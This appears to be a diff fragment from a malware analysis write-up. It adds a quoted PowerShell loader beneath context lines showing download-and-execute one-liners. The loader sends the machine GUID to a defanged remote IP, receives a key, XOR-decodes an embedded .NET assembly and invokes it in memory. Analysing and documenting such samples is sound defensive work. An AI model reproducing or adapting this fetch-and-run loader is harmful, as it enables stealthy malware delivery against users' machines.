@@ -228,7 +228,29 @@ powershell.exe -command IEX(IWR -UseBasicParsing "hxxps[://]casettalecese[.]it/w
 powershell.exe -command IEX(IWR -UseBasicParsing "hxxps[://]casettalecese[.]it/wp-content/uploads/2022/10/sd2.ps1")
 ```
 
+One of these PowerShell scripts looks like the following:
 
+
+```
+[byte[]] $bindata = (Long Hex Array)
+
+# [Net.ServicePointManager]::SecurityProtocol +='tls12'
+$guid = (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
+$cfb = (new-object net.webclient).downloadstring("hxxp[://]87.121.61[.]55/index.php?id=$guid&subid=FJvijm8h").Split('|')
+$k = $cfb[0];
+
+for ($i = 0; $i -lt $bindata.Length ; ++$i)
+{
+	$bindata[$i] = $bindata[$i] -bxor $k[$i % $k.Length]
+}
+
+$sm = [System.Reflection.Assembly]::Load($bindata)
+$ep = $sm.EntryPoint
+
+
+$ep.Invoke($null, (, [string[]] ($cfb[1], $cfb[2], $cfb[3])))
+
+```
 
 
 
